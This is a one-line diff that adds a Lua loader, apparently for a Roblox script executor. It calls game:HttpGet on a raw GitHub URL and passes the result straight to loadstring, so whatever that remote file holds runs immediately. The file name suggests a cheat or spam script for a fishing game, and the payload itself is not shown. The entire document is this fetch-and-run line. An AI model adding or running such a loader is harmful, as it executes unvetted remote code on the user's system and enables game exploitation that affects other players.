@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/upd-heavyweight-fishing-spam7-r5pe755rmfu1gp.lua"))()
